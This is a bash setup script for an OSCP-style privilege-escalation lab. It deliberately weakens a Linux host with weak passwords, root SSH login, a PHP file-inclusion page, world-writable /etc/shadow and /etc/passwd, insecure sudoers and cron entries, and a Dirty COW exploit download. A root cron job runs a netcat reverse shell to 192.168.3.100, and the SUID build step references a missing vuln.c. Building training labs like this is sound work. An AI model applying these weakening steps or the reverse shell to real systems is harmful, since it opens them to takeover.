#!/bin/bash
# Privilege Escalation Lab Setup Script

# Creating users
echo "[+] Creating users..."
useradd -m -s /bin/bash user
echo "user:user" | chpasswd
useradd -m -s /bin/bash itsupport
echo "itsupport:password321" | chpasswd
echo "[+] Users created."

# Setting up SSH with weak credentials
echo "[+] Setting up SSH..."
apt-get install -y openssh-server
sed -i 's/PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
echo "user:password123" | chpasswd
systemctl restart ssh
echo "[+] SSH setup complete."

# Installing a vulnerable web application with LFI/RFI vulnerability
echo "[+] Setting up a vulnerable web application..."
apt-get install -y apache2 php libapache2-mod-php
cat <<EOF > /var/www/html/index.php
<?php
if(isset(\$_GET['file'])) {
    include(\$_GET['file']);
} else {
    echo 'Welcome to the vulnerable web application!';
}
?>
EOF
echo "[+] Vulnerable web application setup complete."

# Weak File Permissions - Readable /etc/shadow
echo "[+] Setting weak file permissions (readable /etc/shadow)..."
chmod 644 /etc/shadow
echo "[+] Weak file permissions set for /etc/shadow."

# Weak File Permissions - Writable /etc/shadow
echo "[+] Setting weak file permissions (writable /etc/shadow)..."
chmod 666 /etc/shadow
echo "[+] Weak file permissions set for /etc/shadow."

# Weak File Permissions - Writable /etc/passwd
echo "[+] Setting weak file permissions (writable /etc/passwd)..."
chmod 666 /etc/passwd
echo "[+] Weak file permissions set for /etc/passwd."

# Sudo - Shell Escape Sequences
echo "[+] Creating sudo vulnerability with shell escape sequences..."
echo "itsupport ALL=(ALL) NOPASSWD: /bin/bash" >> /etc/sudoers
echo "[+] Sudo shell escape sequence vulnerability added."

# Sudo - Environment Variables (LD_PRELOAD)
echo "[+] Creating sudo vulnerability with LD_PRELOAD..."
echo 'Defaults env_keep += "LD_PRELOAD"' >> /etc/sudoers
echo "[+] Sudo LD_PRELOAD vulnerability added."

# Cron Jobs - PATH Environment Variable
echo "[+] Setting up cron job with PATH environment variable vulnerability..."
echo "* * * * * root PATH=/tmp:\$PATH /usr/bin/env > /dev/null 2>&1" > /etc/cron.d/root
echo "[+] Cron job with PATH environment variable vulnerability added."

# Cron Jobs - File Permissions and Reverse Shell
echo "[+] Setting up cron job with file permissions vulnerability..."
echo "* * * * * root /tmp/vulnscript.sh" > /etc/cron.d/vulncron
cat <<EOF > /tmp/vulnscript.sh
#!/bin/bash
nc -e /bin/bash 192.168.3.100 4444
EOF
chmod 777 /tmp/vulnscript.sh
echo "[+] Cron job with file permissions vulnerability added."

# SUID/SGID Executables - Shared Object Injection
echo "[+] Setting up SUID executable with shared object injection vulnerability..."
gcc -o /usr/local/bin/vulnsuid -z execstack -fno-stack-protector -z execstack -z relro -z now vuln.c
chmod +s /usr/local/bin/vulnsuid
echo "[+] SUID executable with shared object injection vulnerability added."

# Dirty COW Vulnerability (CVE-2016-5195)
echo "[+] Setting up Dirty COW vulnerability..."
apt-get install -y gcc
wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c -O /tmp/dirty.c
gcc -o /tmp/dirty /tmp/dirty.c -lpthread
echo "[+] Dirty COW vulnerability setup complete."

# Setting up Kerberos note and krb5cc cache file
echo "[+] Setting up Kerberos..."
apt-get install -y krb5-user
echo "ariya.stark@north.sevenkingdom.local" > /home/itsupport/admin_note.txt
echo "Needle" > /home/itsupport/krb5cc_ariya.stark
chmod 600 /home/itsupport/admin_note.txt
chmod 600 /home/itsupport/krb5cc_ariya.stark
echo "[+] Kerberos setup complete."

# Proof.txt on the admin desktop
echo "[+] Creating proof.txt on the admin desktop..."
echo "OSCP Proof" > /home/itsupport/Desktop/proof.txt
chmod 600 /home/itsupport/Desktop/proof.txt
echo "[+] Proof.txt created."

# Adding verbosity
echo "[+] Lab setup complete!"
